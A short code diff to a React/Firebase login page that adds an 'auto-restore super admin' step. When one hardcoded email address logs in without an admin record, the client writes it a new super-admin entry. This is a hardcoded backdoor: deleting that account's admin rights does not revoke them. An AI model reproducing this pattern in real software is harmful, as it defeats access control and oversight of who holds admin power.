@@ -83,6 +83,21 @@ export default function Login() {
         
         // Check in admins collection
         const adminDoc = await getDoc(doc(db, 'admins', user.uid));
+        
+        // Auto-restore super admin if they are deleted but logging in
+        if (!adminDoc.exists() && user.email === 'ukungdorkas@gmail.com') {
+          await setDoc(doc(db, 'admins', user.uid), {
+            id: user.uid,
+            email: user.email,
+            role: 'super',
+            status: 'active',
+            createdAt: serverTimestamp(),
+            updatedAt: serverTimestamp()
+          });
+          navigate('/admin');
+          return;
+        }
+
         if (adminDoc.exists()) {
           const adminData = adminDoc.data();
           if (adminData.status === 'pending') {
